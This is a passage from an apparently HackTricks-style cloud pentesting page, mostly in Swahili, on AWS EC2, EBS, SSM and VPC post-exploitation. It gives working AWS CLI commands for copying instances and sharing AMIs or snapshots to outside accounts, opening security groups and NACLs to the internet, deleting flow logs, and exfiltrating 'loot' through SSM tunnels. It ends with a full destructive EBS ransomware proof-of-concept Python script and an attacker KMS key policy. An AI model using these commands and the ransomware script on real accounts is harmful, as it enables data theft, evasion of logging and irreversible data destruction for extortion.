# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Kwa taarifa zaidi angalia:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **huiga nakala ya trafiki ya kuingia na kutoka kwa EC2 instances ndani ya VPC** bila hitaji la kusakinisha chochote kwenye instances hizo. Trafiki iliyonakiliwa kawaida hutumwa kwa kitu kama network intrusion detection system (IDS) kwa ajili ya uchambuzi na ufuatiliaji.\
Muvamizi anaweza kuisababisha kutumika vibaya ili kukamata trafiki yote na kupata taarifa nyeti kutoka ndani yake:

Kwa taarifa zaidi angalia ukurasa huu:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances kawaida zina aina fulani ya taarifa nyeti. Kuna njia tofauti za kuingia ndani (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Hata hivyo, njia nyingine ya kuchunguza ni **kuunda AMI na kuendesha instance mpya (hata kwenye account yako mwenyewe) kutoka kwake**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots ni backups za volumes**, ambazo kawaida zitakuwa na **taarifa nyeti**, kwa hivyo kuzikagua kunapaswa kufichua taarifa hizi.\
Kama ukipata **volume bila snapshot** unaweza: **kuunda snapshot** na kufanya vitendo vifuatavyo au tu **kuimount kwenye instance** ndani ya account:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export EC2 AMI moja kwa moja kwenda S3 kwa kutumia `CreateStoreImageTask` ili kupata raw disk image bila kushirikisha snapshot. Hii inaruhusu forensics kamili zisizo mtandaoni au wizi wa data huku networking ya instance ikibaki bila kubadilishwa.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attach volume ya io1/io2 Multi-Attach kwa instance ya pili na ui-mount kwa read-only ili kuchukua data zinazoendelea bila snapshots. Inafaa wakati volume ya mwathiriwa tayari ina Multi-Attach imewezeshwa ndani ya AZ ile ile.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Create EC2 Instance Connect Endpoint, authorize ingress, na inject ephemeral SSH keys ili kupata private instances kupitia managed tunnel. Hutoa njia za haraka za lateral movement bila kufungua public ports.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Hamisha secondary private IP ya ENI ya mwathiriwa kwenda ENI inayodhibitiwa na mshambulizi ili kujifanya kuwa host zinazotumika ambazo zime-allowlist kwa IP. Inaruhusu kupitisha ACLs za ndani au kanuni za SG zinazotegemea anwani maalum.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociate Elastic IP kutoka kwa instance ya mwathiriwa kwenda kwa mshambulizi ili kukamata traffic inayoingia au kuanzisha connections zinazoonekana kutoka kwa public IPs zinazotumika kama za kuaminika.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Kama rule ya security group inarejea customer-managed prefix list, kuongeza CIDRs za mshambulizi kwenye list hiyo kunapanua kwa utulivu ufikaji kwenye kila rule ya SG inayotegemea bila kubadilisha SG yenyewe.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Create gateway au interface VPC endpoints ili kupata upya outbound access kutoka subnets zilizotengwa. Kutumia AWS-managed private links kunapita controls za IGW/NAT zilizokosekana kwa ajili ya data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Mshambulizi mwenye ruhusa ya `ec2:AuthorizeSecurityGroupIngress` anaweza kuongeza rules za inbound kwa security groups (kwa mfano, kuruhusu tcp:80 kutoka 0.0.0.0/0), hivyo kufichua services za ndani kwa Internet ya umma au mitandao isiyoidhinishwa.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Mshambulizi mwenye ruhusa za ec2:ReplaceNetworkAclEntry (au sawa nazo) anaweza kubadilisha Network ACLs (NACLs) za subnet ili kuziacha zikiwa wazi sana — kwa mfano kuruhusu 0.0.0.0/0 kwenye ports muhimu — na hivyo kufichua anuwai nzima ya subnet kwa Mtandao au kwa sehemu za mtandao zisizoidhinishwa. Tofauti na Security Groups, ambazo zinatumika kwa kila instance, NACLs zinatumika ngazi ya subnet, hivyo kubadilisha NACL kali kunaweza kuwa na mzunguko wa athari mkubwa zaidi kwa kuruhusu ufikiaji kwa hosts wengi zaidi.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Mshambulizi mwenye ruhusa za ec2:Delete* na iam:Remove* anaweza kufuta rasilimali muhimu za miundombinu na usanidi — kwa mfano key pairs, launch templates/versions, AMIs/snapshots, volumes au attachments, security groups au rules, ENIs/network endpoints, route tables, gateways, au managed endpoints. Hii inaweza kusababisha uvurugaji wa huduma mara moja, upotevu wa data, na kupoteza ushahidi wa forensics.

Mfano mmoja ni kufuta security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Elekeza VPC Flow Logs kwenda S3 bucket inayodhibitiwa na mshambuliaji ili kukusanya kwa muda wote metadata ya mtandao (source/destination, ports) nje ya akaunti ya waathiriwa kwa ajili ya long-term reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Hata ukifunga EC2 kwa namna kwamba hakuna trafiki inayoweza kutoka, bado inaweza **exfil via DNS**.

- **VPC Flow Logs haitarekodi hili**.
- Huna ufikiaji wa AWS DNS logs.
- Zima hili kwa kuweka "enableDnsSupport" kuwa false kwa:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Mshambulizi anaweza kuita API endpoints za akaunti anazodhibiti. Cloudtrail itarekodi wito hizi na mshambulizi ataweza kuona exfiltrate data katika Cloudtrail logs.

### Open Security Group

Unaweza kupata ufikiaji zaidi kwa huduma za mtandao kwa kufungua ports kama hivi:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc kwa ECS

Inawezekana kuendesha EC2 instance na kuisajili ili itumike kuendesha ECS instances, kisha kuiba data za instances za ECS.

Kwa [**maelezo zaidi angalia hapa**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Ondoa VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Idhini zinazohitajika:

- `ssm:StartSession`

Mbali na utekelezaji wa amri, SSM inaruhusu traffic tunneling ambayo inaweza kutumiwa vibaya kwa ajili ya pivot kutoka kwenye EC2 instances ambazo hazina ufikaji wa mtandao kutokana na Security Groups au NACLs.
Moja ya matukio ambapo hii inakuwa muhimu ni pivoting kutoka kwa [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) hadi private EKS cluster.

> Ili kuanza session unahitaji SessionManagerPlugin imewekwa: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Sakinisha SessionManagerPlugin kwenye mashine yako
2. Ingia kwenye Bastion EC2 kwa kutumia amri ifuatayo:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Pata credentials za muda za Bastion EC2 AWS kwa kutumia script ya [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Hamisha credentials kwenye mashine yako katika faili `$HOME/.aws/credentials` kama profile `[bastion-ec2]`
5. Ingia kwenye EKS kama Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Sasisha sehemu ya `server` katika faili `$HOME/.kube/config` ili kuelekeza kwa `https://localhost`
7. Unda SSM tunnel kama ifuatavyo:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Trafiki kutoka kwa zana ya `kubectl` sasa imepelekwa kupitia SSM tunnel kupitia Bastion EC2 na unaweza kufikia EKS cluster binafsi kutoka kwenye mashine yako kwa kuendesha:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Kumbuka kwamba muunganisho za SSL zitatofaulu isipokuwa ukiweka bendera `--insecure-skip-tls-verify` (au sawa nayo katika zana za ukaguzi za K8s). Kwa kuwa trafiki imepitishwa kupitia tuneli salama ya AWS SSM, uko salama dhidi ya aina yoyote ya mashambulizi ya MitM.

Hatimaye, mbinu hii si maalum kwa kushambulia private EKS clusters. Unaweza kuweka domains na ports yoyote ili ku-pivot kwenda kwa huduma nyingine ya AWS au programu maalum.

---

#### Quick Local ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

Ikiwa unahitaji tu ku-forward **one TCP port from the EC2 instance to your local host** unaweza kutumia the `AWS-StartPortForwardingSession` SSM document (no remote host parameter required):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Amri inaunda tunnel ya pande zote mbili kati ya workstation yako (`localPortNumber`) na port iliyochaguliwa (`portNumber`) kwenye instance **bila kufungua sheria yoyote za inbound za Security-Group**.

Matumizi ya kawaida:

* **File exfiltration**
1. Kwenye instance anzisha HTTP server ya haraka inayorejea kwa directory unayotaka ku-exfiltrate:

```bash
python3 -m http.server 8000
```

2. Kutoka kwenye workstation yako pakua faili kupitia SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Kupata programu za wavuti za ndani (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Ushauri: Compress and encrypt ushahidi kabla ya exfiltrating ili CloudTrail isirekodi maudhui ya clear-text:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Shiriki AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Tafuta taarifa nyeti katika AMIs za umma na za kibinafsi

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel ni zana iliyoundwa ili **tafuta taarifa nyeti ndani ya Amazon Machine Images (AMIs) za umma au za kibinafsi**. Inafanya kiotomatiki mchakato wa kuanzisha instances kutoka AMIs zinazolengwa, mounting volumu zao, na kuchunguza kwa ajili ya secrets au data nyeti zinazoweza kuwepo.

### Shiriki EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Uthibitisho wa dhana unaofanana na maonyesho ya Ransomware yaliyoonyeshwa katika S3 post-exploitation notes. KMS inapaswa kubadilishwa jina kuwa RMS kwa Ransomware Management Service kutokana na urahisi wa kuitumia ku-encrypt huduma mbalimbali za AWS.

Kwanza kutoka kwa akaunti ya 'attacker' ya AWS, tengeneza customer managed key katika KMS. Kwa mfano huu tutamruhusu AWS kusimamia key data kwa niaba yangu, lakini katika mazingira ya uhalisia malicious actor atahifadhi key data nje ya udhibiti wa AWS. Badilisha key policy ili kuruhusu Principal yoyote wa akaunti ya AWS kutumia key hiyo. Kwa key policy hii, jina la akaunti lilikuwa 'AttackSim' na sheria ya sera inayoaruhusu ufikiaji wote inaitwa 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Sera ya key inahitaji yafuatayo kuwa imewezeshwa ili iweze kutumika kusimbua volume ya EBS:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Sasa ukiwa na key inayopatikana hadharani ya kutumia. Tunaweza kutumia akaunti ya 'victim' ambayo ina baadhi ya instances za EC2 zilizozinduliwa zikiwa na volumes za EBS zisizosimbwa zimeambatishwa. Volumes za EBS za akaunti hii ya 'victim' ndizo tunazolenga kwa kusimbua; shambulio hili linafanywa kwa kuzingatia kuvamiwa kwa akaunti ya AWS yenye idhini kubwa.

Similar to the S3 ransomware example. This attack will create copies of the attached EBS volumes using snapshots, use the publicly available key from the 'attacker' account to encrypt the new EBS volumes, then detach the original EBS volumes from the EC2 instances and delete them, and then finally delete the snapshots used to create the newly encrypted EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Kama ilivyo kwa mfano wa S3 ransomware. Shambulio hili litatengeneza nakala za volumes za EBS zilizoambatishwa kwa kutumia snapshots, litumie key inayopatikana hadharani kutoka kwa akaunti ya 'attacker' kusimbua volumes mpya za EBS, kisha kuondoa (detach) volumes za EBS za awali kutoka kwa instances za EC2 na kuzifuta, na hatimaye kufuta snapshots zilizotumika kuunda volumes mpya zilizosisimbwa. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

This results in only encrypted EBS volumes left available in the account.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Hii inasababisha kubaki volumes za EBS zilizosisimbwa pekee zinazopatikana katika akaunti.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Also worth noting, the script stopped the EC2 instances to detach and delete the original EBS volumes. The original unencrypted volumes are gone now.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Pia inastahili kutajwa kwamba skripti iliizima instances za EC2 ili kuondoa (detach) na kufuta volumes za EBS za awali. Volumes za awali ambazo hazijasimbwa sasa zimepotea.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Next, return to the key policy in the 'attacker' account and remove the 'Outside Encryption' policy rule from the key policy.

Ifuatayo, rudi kwenye key policy katika akaunti ya 'attacker' na ondoa kanuni ya sera ya 'Outside Encryption' kutoka kwenye key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Subiri kidogo ili sera ya ufunguo mpya ianze kuenea. Kisha rudi kwenye akaunti ya 'victim' na ujaribu kuambatanisha moja ya volumes mpya za EBS zilizofichwa. Utagundua kuwa unaweza kuambatanisha volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Lakini unapojaribu kwa kweli kuanzisha instance ya EC2 tena ukiwa umeambatanisha EBS volume iliyofichwa, itashindwa tu na itarudi kutoka kwenye hali ya 'pending' kwenda hali ya 'stopped' kwa muda usiofikia mwisho kwa kuwa EBS volume iliyounganishwa haiwezi ku-decrypt kutumia ufunguo kutokana na sera ya ufunguo kuitowa ruhusa.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Hii ni script ya python iliyotumika. Inapokea AWS creds za akaunti ya 'victim' na thamani ya AWS ARN inayopatikana hadharani kwa ufunguo utakao tumika kwa encryption. Script itaunda nakala zilizo encrypted za VOLUMES ZOTE za EBS zilizoambatanishwa kwenye INSTANCES ZOTE za EC2 katika akaunti ya AWS inayolengwa, kisha itazima kila instance ya EC2, i-detach EBS volumes za awali, kuzifuta, na hatimaye kufuta snapshots zote zilizotumika wakati wa mchakato. Hii itaacha tu EBS volumes zilizofichwa katika akaunti ya 'victim' inayolengwa. TUMIA SCRIPT HII TU KATIKA MAZINGIRA YA MAJARIBIO, NI DESTRUCTIVE NA ITAFUTA VOLUMES ZOTE ASILIMIA ZA AWALI ZA EBS. Unaweza kuzipata tena kwa kutumia KMS key iliyotumika na kuzirejesha katika hali yao ya awali kupitia snapshots, lakini nataka tu kukufahamisha kuwa mwishowe hii ni ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Marejeo

- [Pentest Partners – Jinsi ya kuhamisha faili kwenye AWS kwa kutumia SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
